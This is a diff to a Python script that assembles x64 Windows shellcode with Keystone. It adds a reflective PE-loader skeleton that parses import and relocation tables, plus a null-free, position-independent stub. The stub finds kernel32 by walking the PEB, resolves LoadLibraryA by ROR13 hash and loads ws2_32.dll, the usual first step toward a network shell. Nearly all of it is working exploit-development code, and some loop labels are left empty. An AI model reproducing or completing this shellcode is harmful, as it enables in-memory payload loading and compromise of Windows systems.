@@ -1,3 +1,7 @@
+import ctypes, struct
+import argparse
+from keystone import *
+
 '''
 e_lfanew:		DWORD 0x3c
 BaseReloc		QWORD [0x3C]+0xb0
@@ -118,12 +122,109 @@ Fix_Reloc()
 
 "get_pe_addr:"
 " lea rbx, [rip+0x100];"	# Assume the shellcode stub is 0x100 bytes ahead of PE payload
+
+"iat_init:"
 " mov eax, [rbx+0x3c];"		# eax contains e_lfanew
 " mov r11, [eax+0x90];"		# r11 contains ImportDir RVA
 " add r11, rbx;"		# r11 points to ImportDir
+" mov r12, [eax+0x94];"		# r12 contains ImportDir Size
+" mov rcx, r11;"		# rcx acts as an index, start from ImportDir
+" mov rdx, r11;"
+" add rdx, r12;"		# rdx is the upper bond of ImportDir
+
+"import_descriptor_loop:"
+
+
+"import_descriptor_entry_loop:"
+
+
+
+"basereloc_init:"
 " mov r14, [eax+0xb0];"		# r14 contains BaseRelocDir RVA
 " add r14, rbx;"		# r14 points to BaseRelocDir
 
 
 
 '''
+
+	CODE = (
+"find_kernel32:"
+" xor rdx, rdx;"
+" mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
+" mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
+" mov rsi,[rsi + 0x30];"        # RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
+" mov r9, [rsi];"        # Current module is python.exe
+" mov r9, [r9];"        # Current module is ntdll.dll
+" mov r9, [r9+0x10];"        # Current module is kernel32.dll
+" jmp jump_section;"
+
+"parse_module:"        # Parsing DLL file in memory
+" mov ecx, dword ptr [r9 + 0x3c];"        # R9 stores the base address of the module, get the NT header offset
+" xor r15, r15;"
+" mov r15b, 0x88;"	# Offset to Export Directory   
+" add r15, r9;"
+" add r15, rcx;"
+" mov r15d, dword ptr [r15];"        # Get the RVA of the export directory
+" add r15, r9;"        # R14 stores  the VMA of the export directory
+" mov ecx, dword ptr [r15 + 0x18];"        # ECX stores the number of function names as an index value
+" mov r14d, dword ptr [r15 + 0x20];"        # Get the RVA of ENPT
+" add r14, r9;"        # R14 stores  the VMA of ENPT
+
+"search_function:"        # Search for a given function
+" jrcxz not_found;"        # If RCX is 0, the given function is not found
+" dec ecx;"        # Decrease index by 1
+" xor rsi, rsi;"
+" mov esi, [r14 + rcx*4];"        # RVA of function name string
+" add rsi, r9;"        # RSI points to function name string
+
+"function_hashing:"        # Hash function name function
+" xor rax, rax;"
+" xor rdx, rdx;"
+" cld;"        # Clear DF flag
+
+"iteration:"        # Iterate over each byte
+" lodsb;"        # Copy the next byte of RSI to Al
+" test al, al;"        # If reaching the end of the string
+" jz compare_hash;"        # Compare hash
+" ror edx, 0x0d;"        # Part of hash algorithm
+" add edx, eax;"        # Part of hash algorithm
+" jmp iteration;"        # Next byte
+
+"compare_hash:"        # Compare hash
+" cmp edx, r8d;"
+" jnz search_function;"        # If not equal, search the previous function (index decreases)
+" mov r10d, [r15 + 0x24];"        # Ordinal table RVA
+" add r10, r9;"        # Ordinal table VMA
+" movzx ecx, word ptr [r10 + 2*rcx];"        # Ordinal value -1
+" mov r11d, [r15 + 0x1c];"        # RVA of EAT
+" add r11, r9;"        # VMA of EAT
+" mov eax, [r11 + 4*rcx];"        # RAX stores RVA of the function
+" add rax, r9;"        # RAX stores  VMA of the function
+" ret;"
+"not_found:"
+" ret;"
+
+"jump_section:"        # Achieve PIC and elminiate 0x00 byte
+" mov rbp, r9;"        # RBP stores base address of Kernel32.dll
+" mov r8d, 0xec0e4e8e;"        # LoadLibraryA Hash
+" call parse_module;"        # Search LoadLibraryA's address
+" mov r12, rax;"        # R12 stores the address of LoadLibraryA function
+
+"load_module:"
+" xor rax, rax;"
+" mov ax, 0x6c6c;"        # Save the string "ll" to RAX
+" push rax;"        # Push the string to the stack
+" mov rax, 0x642E32335F325357;"        # Save the string "WS2_32.D" to RAX
+" push rax;"        # Push the string to the stack
+" mov rcx, rsp;"        # RCX points to the "WS2_32.dll" string
+" sub rsp, 0x20;"        # Function prologue
+" mov rax, r12;"        # RAX stores address of LoadLibraryA function
+" call rax;"        # LoadLibraryA("ws2_32.dll")
+" add rsp, 0x20;"        # Function epilogue
+" mov r14, rax;"        # R14 stores the base address of ws2_32.dll
+)
+	ks = Ks(KS_ARCH_X86, KS_MODE_64)
+	encoding, count = ks.asm(CODE)
+
+
+
